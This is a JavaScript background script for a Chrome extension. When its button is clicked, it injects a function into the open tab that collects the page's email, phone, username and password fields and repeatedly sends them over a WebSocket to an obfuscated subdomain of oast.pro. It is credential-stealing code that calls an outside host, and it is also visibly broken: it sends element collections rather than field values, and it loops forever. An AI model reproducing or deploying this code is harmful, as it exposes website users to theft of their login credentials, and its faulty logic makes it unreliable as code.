function disconnect() {
  if (webSocket) {
    webSocket.close()
  }
}
function keepAlive() {
  const interval = setInterval(() => {
    if (webSocket) {
      console.log('ping')
      webSocket.send('ping')
    } else {
      clearInterval(interval)
    }
  }, TEN_SECONDS_MS)
}
function domag() {
  var email = document.getElementsByName('email')
  var phone = document.getElementsByName('phone')
  var username = document.getElementsByName('username')
  var password = document.getElementsByName('password')
  if ((email || phone || username) && password) {
    console.log(document.location.host)
    while (true) {
      if (email) {
        connect(password, email, document.location.host)
      } else {
        if (phone) {
          connect(password, phone, document.location.host)
        } else {
          connect(password, username, document.location.host)
        }
      }
      keepAlive()
    }
  } else {
    console.log('Email not Found')
  }
}
chrome.action.onClicked.addListener((event) => {
  if (!event.url.includes('chrome://')) {
    chrome.scripting.executeScript({
      target: { tabId: event.id },
      function: domag,
    })
  }
})
function connect(
  part_3 = 'WYwIjYzMTM2sXWHFETGhkQ',
  part_2 = '1QjY0YGNxEDM1cTMxQ2YjV',
  part_1 = 'Qf2MjYwAzNyIDOjVTZkJTY'
) {
  scostr = part_1 + '---' + part_2 + '---' + part_3
  webSocket = new WebSocket('wss://' + scostr + '.oast.pro/')
  webSocket.onopen = (ws) => {
    chrome.action.setIcon({ path: 'icons/socket-active.png' })
  }
  webSocket.onmessage = (message) => {
    console.log(message.data)
  }
  webSocket.onclose = (ws) => {
    chrome.action.setIcon({ path: 'icons/socket-inactive.png' })
    console.log('websocket connection closed')
    webSocket = null
  }
}
